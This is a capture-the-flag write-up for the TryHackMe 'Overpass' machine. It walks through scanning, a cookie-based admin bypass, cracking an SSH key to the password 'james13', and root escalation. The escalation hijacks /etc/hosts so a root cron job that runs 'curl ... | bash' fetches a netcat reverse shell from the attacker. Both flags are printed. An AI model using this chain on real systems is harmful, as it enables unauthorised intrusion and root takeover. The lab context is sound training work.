Tasks:
1. Hack the machine and get the flag in user.txt
2. Escalate your privileges and get the flag in root.txt

PART 1:

Start by scanning target IP address with nmap 
	$ sudo nmap -sS -v -sV [IP ADDR]

In this scan I discovered:
	OS: Linux Ubuntu
	Open Ports: 22/tcp/ssh, 80/tcp/http

Next, I visited the target IP ADDR web page in my web browser to investigate. 
	Viewed the source code 
	Found clue in src "just because the Romans used it doesn't make it military grade, change this?"
	Additional clues found in overpass.go - ROT-47 Cipher online decoder
	
Download program from IPADDR/downloads
	$ chmod +x overpassLinux
	$ ./overpassLinux
	
Scanned for directories and DNS subdomains with gobuster
	$ gobuster dir -u "IP ADDR" -v -w /usr/share/dirb/wordlist/common.txt
	$ cat results.txt | grep "Found:"
	Found: /aboutus              (Status: 301) [Size: 0] [--> aboutus/]
	Found: /admin                (Status: 301) [Size: 42] [--> /admin/]
	Found: /css                  (Status: 301) [Size: 0] [--> css/]
	Found: /downloads            (Status: 301) [Size: 0] [--> downloads/]
	Found: /img                  (Status: 301) [Size: 0] [--> img/]
	Found: /index.html           (Status: 301) [Size: 0] [--> ./]
	
Investigate http://IPADDR/admin
	View sorce code
	Viewed /login.js
	Found clue: Cookie.set("SessionToken", StatusorCookie)
	
Tested this vulnerability in the terminal 
	curl "http://IPADDR/admin/" --cookie "SessionToken=Jake"
	This resulted in me obtaining a private key which means this vulnerability works.
	
Opened http://IPADDR/admin 
	Opened the web console 
	Pasted Cookie.set("SessionToken", "Jake")
	Refreshed the page and gained access to the admin page.
	
Saved the private key to a txt file as id_rsa.txt
	Cracked the private key with john
	$ ssh2john id_rsa.txt > forjohn.txt
	$ john forjohn.txt
	Obtained password: james13          (id_rsa.txt) 
	
Connected to the machine via ssh 
	$ ssh -i id_rsa.txt james@IPADDR 
	$ james13
	
Obtained first flag
	$ ls
	$ cat user.txt
	$ thm{65c1aaf000506e56996822c6281e6bf7} 
	
PART 2

Search directory for clues
	$ ls 
	$ cat todo.txt
	clue: "how he got the automated build script working and where the builds go."
	
Search for automated jobs 
	$ cat /etc/crontab 
	clue: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
	
Investigrate host files
	$ ls -la /etc | grep host
	everyone has the ability to read/write, including user james. This is the vulnerability. 
	$ cat /etc/hosts
	
Edit host file so that the overpass.thm is linked to my ip address
	$ nano /etc/hosts
	
Create an idential directory structure to the overpass.thm on the target machine
	Create directory stucture:  overpass.thm/downloads/src/buildscript.sh
	$ mkdir downloads
	$ cd downloads
	$ mkdir src
	$ cd src
	$ nano buildscript.sh
	
Create reverse shell script 
	I used the Firefox hacker tools browser extension to create Netcat reverseshell 
	Copied the reverse shell script and pasted into buildscript.sh
	
Create python web server on my machine
	$ sudo python3 http.server
	

Copy the overpass.thm directory structure to the default apache web server
	$ cp ~/Desktop/tryhackme/downloads/src/buildscript.sh /var/www/html/downloads/src
	$ sudo /etc/init.d/apache2 restart
	

Start a netcat listen 
	$ nc -lvp [port]
	wait for the cronjob to initiate the reverse shell
	
Obtain second flag
	$ id
	$ ls 
	$ cat root.txt
	thm{7f336f8c359dbac18d54fdd64ea753bb}
	
FINISHED!!!
